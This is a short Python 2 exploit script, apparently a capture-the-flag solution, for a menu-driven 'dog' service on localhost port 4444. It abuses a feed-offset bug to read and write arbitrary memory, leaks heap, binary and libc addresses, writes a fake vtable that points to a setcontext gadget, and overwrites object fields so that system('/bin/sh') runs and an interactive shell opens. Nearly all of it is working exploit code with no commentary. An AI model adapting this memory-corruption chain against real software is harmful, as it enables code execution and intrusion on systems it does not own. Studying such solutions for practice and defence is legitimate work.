#!/usr/bin/env python2
from pwnlib.tools import *
connect('localhost', 4444)

def wait_for_menu():
    ru('Choice: ')

def get(ty):
    wait_for_menu()
    sendln(1)
    sendln(ty)

def talk():
    x = ru('says:')
    if 'Dog drops' in x:
        return x.split('Dog drops ')[1].split('\nDog says')[0]

def throw(s, wait=True):
    wait_for_menu()
    sendln(2)
    sendln("throw")
    sendln(s)
    if wait:
        return talk()

def bread(x):
    wait_for_menu()
    sendln(2)
    sendln("feed")
    ru('give? ')
    sendln(x)
    return (int(ru(' ').strip()), talk())

def read(addr):
    current,_ = bread(0)
    _,x = bread((addr-current)%2**64)
    return u64(x[:8])

def write(addr, what):
    current,_ = bread(0)
    _,_ = bread((addr-current)%2**64)
    throw(what, wait=False)

raw_input('press ENTER to continue')

get('x')

throw('x'*200)

string_buf,_ = bread(0)
info('original buffer @ %p', string_buf)
animal = string_buf - 0x100219270 + 0x100218e90
info('animal @ %p', animal)

vtable = read(animal)
info('vtable @ %p', vtable)
binary = vtable - 0x203d48
info('binary @ %p', binary)
memcpy = read(binary + 0x204058)
info('memcpy @ %p', binary)
libc = memcpy - 0x00007ffff728e440 + 0x00007ffff7137000
info('libc @ %p', libc)
setcontext_gadget = libc + 0x7ffff717b9e7 - 0x00007ffff7137000
system = libc + 0x7ffff7178fa0 - 0x00007ffff7137000

vtab = ""
vtab += p64(0x41414141)
vtab += p64(0x42424242)
vtab += p64(setcontext_gadget)
assert not "\n" in vtab

write(string_buf, vtab)
write(animal+0x68, p64(animal+0x70)+"/bin/sh")
write(animal+0xa8, p64(system))
write(animal, p64(string_buf))

interact()
